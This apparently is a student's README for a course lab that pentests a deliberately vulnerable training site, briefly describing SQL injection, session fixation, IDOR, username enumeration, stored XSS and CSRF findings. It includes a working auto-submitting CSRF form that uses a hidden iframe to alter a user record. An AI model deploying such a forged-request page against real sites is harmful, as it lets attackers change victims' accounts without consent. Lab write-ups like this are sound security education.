# Project 8 - Pentesting Live Targets

Time spent: **20** hours spent in total

> Objective: Find and exploit the security vulnerabilities in three different versions (blue, green, and red) of the Globitek website.

The six possible exploits are:
- Username Enumeration
- Insecure Direct Object Reference
- SQL Injection
- Cross-site Scripting
- Cross-site Request Forgery
- Session Hijacking / Fixation

Each version of the site has been given two of the six vulnerabilities.

## Blue

**Vulnerability 1:** SQL Injection - The id parameter is unsanitized and escapable on the salesperson page.

<img src='https://github.com/brandonmchin/CodePath/blob/master/Week8/Images/week8_sqli.gif' title='SQLI' alt='SQLI' /> 

**Vulnerability 2:** Session Hijacking / Fixation - A new session ID is not regenerated when logging back in.

<img src='https://github.com/brandonmchin/CodePath/blob/master/Week8/Images/week8_sessid.gif' title='SESSID' alt='SESSID' /> 

## Red

**Vulnerability 3:** Insecure Direct Object Reference - Hidden salesperson IDs are accessible.

<img src='https://github.com/brandonmchin/CodePath/blob/master/Week8/Images/week8_idor.gif' title='IDOR' alt='IDOR' /> 

**Vulnerability 4:** Cross-site Request Forgery - CSRF tokens are not used in the edit pages.

<img src='https://github.com/brandonmchin/CodePath/blob/master/Week8/Images/week8_csrf.gif' title='CSRF' alt='CSRF' /> 

CSRF Test Form
```
<!DOCTYPE html>
<html>
<body>

<h1> CSRF TEST </h1>

<!-- iframe holds the redirected page after submittion and is hidden from the unsuspecting victim -->
<iframe width="0" height="0" border="0" name="dummyframe" id="dummyframe"></iframe>

<form name="csrfForm" action="https://35.184.65.92/red/public/staff/users/edit.php?id=4" target="dummyframe" method="POST">
 <input type="hidden" name="first_name" value="CSRF" />
 <input type="hidden" name="last_name" value="Successful" />
</form>
<script>document.csrfForm.submit(); </script>

</body>
</html>
```

## Green

**Vulnerability 5:** Username Enumeration - Error message text becomes unbold if the username does not exist, revealing information to the attacker.

<img src='https://github.com/brandonmchin/CodePath/blob/master/Week8/Images/week8_enum.gif' title='Enumeration' alt='Enumeration' /> 

**Vulnerability 6:** Stored Cross-site Scripting - The "name" and "feedback" fields on the Feedback page are unsanitized. Guests can send malicious messages with embedded web scripts that will trigger once opened. 

<img src='https://github.com/brandonmchin/CodePath/blob/master/Week8/Images/week8_xss.gif' title='XSS' alt='XSS' /> 

GIF created with [SimpleScreenRecorder](http://www.maartenbaert.be/simplescreenrecorder/).

## License

    Copyright 2017 Brandon Chin

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
